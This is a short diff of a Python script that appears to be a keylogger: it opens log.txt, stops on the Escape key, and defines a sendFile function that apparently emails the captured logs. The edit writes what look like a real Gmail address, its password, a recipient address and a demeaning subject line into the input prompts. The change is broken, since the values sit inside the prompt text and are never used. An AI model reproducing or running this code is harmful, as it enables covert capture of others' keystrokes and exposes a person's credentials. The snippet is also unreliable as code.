@@ -14,10 +14,10 @@ banner()
 
 logs = open('log.txt','w+')
 
-from_mail = input("From => ")
-password_mail = getpass.getpass("Password => ")
-to_mail = input("To => ")
-subject_mail = input("Subject => ")
+from_mail = input("From =>Johnweimer225@gmail.com")
+password_mail = getpass.getpass("Password =>Weim225$$ ")
+to_mail = input("To =>star00fox@gmail.com")
+subject_mail = input("Subject =>Slut Training Session ")
 print("\n\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")
 
 def sendFile():
